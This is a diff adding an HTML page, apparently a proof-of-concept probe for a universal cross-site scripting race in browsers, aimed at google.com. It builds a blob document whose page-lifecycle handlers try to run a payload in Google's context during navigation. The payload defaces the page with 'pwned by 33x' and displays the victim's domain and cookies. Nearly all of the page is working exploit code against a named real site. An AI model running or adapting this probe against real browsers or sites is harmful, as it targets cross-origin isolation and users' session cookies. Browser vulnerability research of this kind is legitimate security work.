@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>0-click UXSS probe — lifecycle race</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:24px;line-height:1.6}
+  button{background:#d92d20;color:#fff;border:0;border-radius:8px;padding:14px 24px;font-size:16px;font-weight:600;cursor:pointer}
+  #log{white-space:pre-wrap;background:#0f1115;color:#d7e0ea;border-radius:8px;padding:12px 14px;font-family:ui-monospace,Menlo,monospace;font-size:12px;min-height:50px;margin-top:16px}
+  code{background:#eee;padding:1px 5px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>0-click-style UXSS probe — target google.com</h1>
+<p>Blob doc (attacker origin) registers <code>pagehide</code>/<code>unload</code>/<code>visibilitychange</code> handlers, then navigates to <code>google.com</code>. If a handler's payload runs in google's context during the document swap → UXSS.</p>
+<button id="go">Run lifecycle-race probe</button>
+<div id="log">ready.</div>
+
+<script>
+function log(m){ var e=document.getElementById('log'), d=document.createElement('div'); d.textContent=m; e.appendChild(d); }
+
+document.getElementById('go').addEventListener('click', function(){
+  // payload runs in whatever context the lifecycle handler executes in.
+  // If that is google.com => document.domain/cookie are google's => UXSS.
+  var payload =
+    "try{document.write('<h1 style=\"color:red;font-family:sans-serif\">pwned by 33x</h1>');}catch(e){}" +
+    "try{document.body&&document.body.insertAdjacentHTML('afterbegin','<h1 style=\"color:red\">pwned by 33x</h1>');}catch(e){}" +
+    "try{alert('pwned by 33x @ '+document.domain+' :: cookie='+document.cookie);}catch(e){}";
+
+  var inner =
+    "<!doctype html><meta charset=utf-8>" +
+    "<body style='font-family:sans-serif;padding:20px'>blob doc (attacker origin) - navigating to google.com, firing payload on lifecycle events..." +
+    "<scr" + "ipt>" +
+      "function p(){ " + payload + " }" +
+      "addEventListener('pagehide', p);" +
+      "addEventListener('unload', p);" +
+      "addEventListener('beforeunload', p);" +
+      "addEventListener('visibilitychange', function(){ if(document.visibilityState==='hidden') p(); });" +
+      "setTimeout(function(){ location.href='https://www.google.com/'; }, 700);" +
+    "</scr" + "ipt></body>";
+
+  var b = new Blob([inner], {type:'text/html'});
+  log('navigating to blob doc; it will hop to google.com in 0.7s. Watch for the alert / red \"pwned by 33x\".');
+  location.href = URL.createObjectURL(b);
+});
+</script>
+</body>
+</html>
